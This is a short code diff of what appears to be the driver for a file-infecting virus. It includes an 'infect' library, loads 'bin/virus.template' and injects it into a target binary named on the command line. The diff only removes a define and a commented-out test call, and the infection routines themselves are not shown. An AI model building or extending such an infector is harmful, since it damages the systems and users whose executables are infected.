@@ -1,4 +1,3 @@
-#define INFECTOR
 #include "lib/lib.c"
 #include "lib/infect.c"
 
@@ -29,7 +28,6 @@ void test(){
 }
 
 int main(int ac, char **av){
-//	test();
 
 	printf("start:%zu\n");
 	if (ac < 2){
@@ -39,5 +37,7 @@ int main(int ac, char **av){
 	fget("bin/virus.template", &template, &n);
 	infect_to(av[1], "out.bin", template, n);
 	printnb(12222);
+
+	
 	return 0;
 }
